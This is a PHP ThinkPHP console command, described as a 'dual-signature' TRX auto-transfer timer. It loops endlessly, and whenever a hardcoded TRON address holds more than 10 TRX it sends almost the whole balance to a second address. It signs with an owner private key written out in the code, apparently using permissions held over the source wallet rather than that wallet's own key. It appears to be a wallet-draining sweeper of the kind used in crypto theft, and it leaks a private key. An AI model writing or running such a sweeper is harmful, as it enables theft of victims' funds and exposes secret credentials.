<?php
/**
 * 自动双签转TRX
 */
namespace app\command;
use app\common\library\Trxscan;
use think\console\Command;
use think\console\Input;
use think\console\Output;
use think\Db;
use think\Exception;

class Atmpy extends Command
{

    protected function configure()
    {
        $this->setName('Atmpy')
            ->setDescription('奥特曼朋友钱包定时器');
    }
    public function execute(Input $input, Output $output)
    {
        ini_set('max_execution_time',0);
        $output->writeln('----- '.date('y-m-d H:i:s').' 当前正在执行奥特曼朋友钱包定时器 -----');
        while (true) {
            $ownerAddress = 'TXbbUjHKGetvjW4qaQvi1QYB4y3GvaCvmn';
            $from = 'T9zhdY6J2JStHPhCcdphJuT42bLx8wGP86';
            $to = 'TXbbUjHKGetvjW4qaQvi1QYB4y3GvaCvmn';
            $trx = (new \app\common\service\Getbalance())->getBalance(1,$from);
//            $output->writeln('-----trx: ' .$trx . ' -----');
            if($trx > 10){
                $trx = $trx - 1;
                $uri = 'https://api.trongrid.io';
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                $config = [
                    'contract_address' => '',
                    'decimals' => 6,
                ];
                $trxWallet = new \Tron\TRX($api,$config);
                $ownerAddress = new \Tron\Address($ownerAddress,'0df39ab839a86d9e1faba4a36f738ff4fe537c7e88046bc77913888d71d44c94',$trxWallet->tron->address2HexString($ownerAddress) );
                $from = new \Tron\Address($from,'000',$trxWallet->tron->address2HexString($from) );
                $to = new \Tron\Address($to,'',$trxWallet->tron->address2HexString($to) );
                try {
                    $trxWallet->transferfrom($ownerAddress,$from,$to,$trx);
                } catch (Exception $e) {
                }
            }
            sleep(10);
            $output->writeln('----- ' . date('y-m-d H:i:s') . ' -----');
        }
    }
}
